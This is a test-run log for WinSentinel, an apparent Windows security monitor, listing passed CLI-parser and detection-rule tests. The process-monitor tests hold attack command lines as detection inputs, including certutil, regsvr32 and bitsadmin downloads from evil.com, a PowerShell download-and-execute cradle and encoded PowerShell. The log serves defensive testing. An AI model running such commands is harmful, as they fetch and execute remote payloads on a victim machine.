  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreList_DefaultAction [5 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditVariants(arg: "--audit") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditVariants(arg: "-a") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreAdd_RequiresPattern [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreRemove_WithId [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_LongOutput_SetsOutputFile [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.CliOptions_MarkdownDefault_IsFalse [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineDelete_ParsesName [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ExpireDays_OutOfRange [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MissingOutputValue_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MissingDaysValue_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ShowIgnored_Flag [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_InvalidThreshold_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ProfileVariants(flag: "-p") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ProfileVariants(flag: "--profile") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreAdd_WithAllOptions [1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ChecklistWithJson_ReturnsChecklist [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditWithMarkdown_SetsMarkdownFlag [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_VersionStopsProcessing [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_CompareOnly_DefaultsToHistory [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreModule_MissingValue [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MarkdownWithOutput_AllFlagsSet [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_NoArgs_ReturnsNone [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ProfileFlag_SetsProfileName [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Version_ReturnsVersion [2 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditWithJson_SetsJsonFlag [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Days1_IsValid [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ProfilesWithJson_ReturnsProfiles [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_UnknownType_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Profiles_ReturnsProfiles [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ProfileWithScore_SetsProfileName [1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Audit_ReturnsAudit [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_DaysOutOfRange_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ScoreVariants(arg: "--score") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ScoreVariants(arg: "-s") [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HelpStopsProcessing [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ChecklistWithOutput_ReturnsChecklist [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditWithQuiet_SetsQuietFlag [1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_LimitOutOfRange_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Limit100_IsValid [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditWithModulesFilter_SetsModulesFilter [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ProfileWithJson_SetsAll [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryDefaultDays_Is30 [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditWithMdShorthand_SetsMarkdownFlag [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ThresholdZero_IsValid [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Limit1_IsValid [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ThresholdOutOfRange_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_FixAll_ReturnsFixAll [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreListWithJson [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryCompareWithJson_AllFlagsSet [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MarkdownOnly_DefaultsToAudit [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ModulesOnly_DefaultsToAudit [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_WithJson [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryWithDiff_SetsDiffFlag [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_NegativeThreshold_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_UnknownOption_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryWithLimitShort_SetsLimit [2 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryWithLimit_SetsLimit [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Score_ReturnsScore [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryDefaultLimit_Is20 [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineCheck_WithJsonOutput [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreSeverity_MissingValue [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryWithJson_SetsJsonFlag [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Checklist_ReturnsChecklist [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineSave_WithForce [1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_QuietOnly_DefaultsToAudit [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ProfileWithOutput_SetsAll [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MatchMode_MissingValue [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditWithOutputFile_SetsOutputFile [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreClear [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineSave_ParsesNameCorrectly [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MissingThresholdValue_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreRm_AliasForRemove [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditWithHtml_SetsHtmlFlag [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Threshold100_IsValid [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryWithDays_SetsDays [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MissingModulesValue_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreRemove_RequiresId [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_WithOutput [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_ModuleWithFilter [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Help_ReturnsHelp [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ShortFlags_Work [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryWithCompare_SetsCompareFlag [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ChecklistWithQuiet_ReturnsChecklist [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineInvalidAction_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MissingLimitValue_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_DaysZero_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Badge_DefaultsToScore [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ExpireDays_InvalidValue [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineSave_WithModulesFilter [3 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnorePurge [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreReason_MissingValue [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.CliOptions_DefaultValues_AreCorrect [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreAdd_WithPattern [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ComplexCommand_AllFlagsSet [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreListExplicit [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.CliOptions_ProfileDefaults [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_Days365_IsValid [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_History_ReturnsHistory [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineDelete_MissingName_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineCheck_MissingName_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BadgeStyle_InvalidValue_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_ProfileWithQuiet_SetsAll [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.CliOptions_IgnoreDefaults [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_HistoryDiffWithDaysAndLimit_AllOptionsSet [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineList_Works [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_AuditWithThreshold_SetsThreshold [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineSave_MissingName_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.CliOptions_BadgeDefaults [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_JsonOnly_DefaultsToAudit [1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineSave_WithDesc [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.CliOptions_BaselineDefaults [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_IgnoreUnknownAction_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_MdOnly_DefaultsToAudit [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_BaselineCheck_WithJson [< 1 ms]
  Passed WinSentinel.Tests.Cli.CliParserTests.Parse_InvalidDays_ReturnsError [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_HighRisk_LogsOnly [15 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsMacroAttack(parent: "winword.exe", child: "cmd.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsMacroAttack(parent: "excel.exe", child: "powershell.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsMacroAttack(parent: "outlook.exe", child: "wscript.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsMacroAttack(parent: "acrord32.exe", child: "cmd.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsEncodedPowerShell(commandLine: "powershell.exe -enc SQBFAFgA") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsEncodedPowerShell(commandLine: "powershell.exe -ec SQBFAFgA") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsEncodedPowerShell(commandLine: "pwsh.exe -e SQBFAFgA") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsEncodedPowerShell(commandLine: "powershell.exe -EncodedCommand SQBFAFgA") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_RecycleBinIsCritical [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsSuspiciousPowerShell(commandLine: "powershell.exe IEX (New-Object Net.WebClient).Down"┬╖┬╖┬╖) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsSuspiciousPowerShell(commandLine: "powershell.exe -NoProfile -WindowStyle Hidden -Com"┬╖┬╖┬╖) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsSuspiciousPowerShell(commandLine: "powershell.exe -ExecutionPolicy Bypass -File scrip"┬╖┬╖┬╖) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsSuspiciousPowerShell(commandLine: "powershell.exe (New-Object Net.WebClient).Download"┬╖┬╖┬╖) [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_MediumRisk_AlertsOnly [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsLolBins(processName: "certutil.exe", commandLine: "-urlcache -split -f http://evil.com/payload.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsLolBins(processName: "cscript.exe", commandLine: "c:\\temp\\script.js") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsLolBins(processName: "regsvr32.exe", commandLine: "/s /u /i:http://evil.com/file.sct scrobj.dll") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsLolBins(processName: "wscript.exe", commandLine: "c:\\temp\\script.vbs") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsLolBins(processName: "bitsadmin.exe", commandLine: "/transfer job http://evil.com/a.exe c:\\a.exe") [1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsLolBins(processName: "mshta.exe", commandLine: "") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_CertutilUrlcacheIsCritical [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_RateLimitsDuplicateAlerts [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_NormalParentChildIsOk [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsUnexpectedSystemProcess [1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsSuspiciousPath(exePath: "C:\\Windows\\Temp\\dropper.exe", expectedTitle: "Suspicious Launch Path") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsSuspiciousPath(exePath: "C:\\Users\\Test\\AppData\\Local\\Temp\\malware.exe", expectedTitle: "Suspicious Launch Path") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsSuspiciousPath(exePath: "C:\\Users\\Test\\Downloads\\sketch.exe", expectedTitle: "Suspicious Launch Path") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsSuspiciousPath(exePath: "C:\\Users\\Test\\Desktop\\hack.exe", expectedTitle: "Suspicious Launch Path") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_DetectsSuspiciousPath(exePath: "C:\\$Recycle.Bin\\S-1-5-21\\evil.exe", expectedTitle: "Suspicious Launch Path") [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_Rundll32JavascriptIsCritical [1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.IsActive_InitiallyFalse [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_NormalPowerShellIsOk [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.Name_ReturnsProcessMonitor [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_IgnoresKnownAppDataApps [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_ExpectedSystemProcessIsOk [< 1 ms]
  Passed WinSentinel.Tests.Agent.ProcessMonitorModuleTests.AnalyzeProcess_MultipleRulesCanTrigger [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsStartupPersistence(fileName: "readme.txt", expectedMinSeverity: High) [9 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsStartupPersistence(fileName: "shortcut.lnk", expectedMinSeverity: High) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsStartupPersistence(fileName: "script.vbs", expectedMinSeverity: Critical) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsStartupPersistence(fileName: "malware.exe", expectedMinSeverity: Critical) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsStartupPersistence(fileName: "backdoor.bat", expectedMinSeverity: Critical) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.Name_ReturnsFileSystemMonitor [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsTrueForSafePatterns(path: "C:\\Windows\\Prefetch\\APP.EXE-12345.pf") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsTrueForSafePatterns(path: "C:\\Users\\Test\\AppData\\Local\\WinSentinel\\conf"┬╖┬╖┬╖) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsTrueForSafePatterns(path: "C:\\Windows\\SoftwareDistribution\\update.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsTrueForSafePatterns(path: "C:\\ProgramData\\Microsoft\\Windows Defender\\Defi"┬╖┬╖┬╖) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsTrueForSafePatterns(path: "C:\\System Volume Information\\data.bin") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.CheckHostsFileModification_Created [1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsActive_InitiallyFalse [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".cmd") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".ps1") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".com") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".msi") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".js") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".bat") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".hta") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".pif") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".scr") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".wsf") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".vbs") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.DangerousExtensions_ContainsExpected(ext: ".dll") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSuspiciousScript(fileName: "backdoor.hta", category: Downloads) [6 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSuspiciousScript(fileName: "exploit.cmd", category: TempDirectory) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSuspiciousScript(fileName: "macro.vbs", category: Downloads) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSuspiciousScript(fileName: "loader.js", category: Downloads) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSuspiciousScript(fileName: "dropper.bat", category: TempDirectory) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSuspiciousScript(fileName: "payload.ps1", category: TempDirectory) [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_HighRisk_LogsOnly [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSystem32Drop(fileName: "macro.vbs") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSystem32Drop(fileName: "dropper.scr") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSystem32Drop(fileName: "implant.js") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSystem32Drop(fileName: "loader.cmd") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSystem32Drop(fileName: "evil.dll") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSystem32Drop(fileName: "payload.bat") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSystem32Drop(fileName: "script.ps1") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsSystem32Drop(fileName: "malware.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_NoFalsePositiveMasquerading(fileName: "setup.exe") [2 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_NoFalsePositiveMasquerading(fileName: "archive.tar.gz") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_NoFalsePositiveMasquerading(fileName: "report.pdf") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_NoFalsePositiveMasquerading(fileName: "photo.jpg") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsFalseForSuspiciousPaths(path: "C:\\Users\\Test\\Downloads\\suspicious.bat") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsFalseForSuspiciousPaths(path: "C:\\Windows\\Tasks\\evil.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsFalseForSuspiciousPaths(path: "C:\\Windows\\System32\\malware.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsNewExecutableInDownloads(fileName: "setup.exe") [1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsNewExecutableInDownloads(fileName: "screensaver.scr") [2 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsNewExecutableInDownloads(fileName: "installer.msi") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_IgnoresStartupChangedEvent [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsNewScheduledTask [1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DownloadsScriptAndMasquerading [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_RateLimitsDuplicateAlerts [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsExtensionMasquerading(fileName: "archive.zip.ps1") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsExtensionMasquerading(fileName: "report.pdf.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsExtensionMasquerading(fileName: "invoice.docx.bat") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsExtensionMasquerading(fileName: "document.txt.vbs") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsExtensionMasquerading(fileName: "video.mp4.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsExtensionMasquerading(fileName: "photo.jpg.scr") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsExecutableInTasks(fileName: "dropper.bat") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsExecutableInTasks(fileName: "malware.exe") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_DetectsExecutableInTasks(fileName: "implant.dll") [1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.AnalyzeEvent_IgnoresSystem32ChangedEvent [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.HasContentChanged_ReturnsTrueForNewFile [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsTrueForSafeTempExtensions(path: "C:\\Users\\Test\\AppData\\Local\\Temp\\trace.etl") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsTrueForSafeTempExtensions(path: "C:\\Users\\Test\\AppData\\Local\\Temp\\session.log") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.IsKnownSafe_ReturnsTrueForSafeTempExtensions(path: "C:\\Users\\Test\\AppData\\Local\\Temp\\data.tmp") [< 1 ms]
  Passed WinSentinel.Tests.Agent.FileSystemMonitorModuleTests.CheckExtensionMasquerading_DetectsDocExeCombo [< 1 ms]
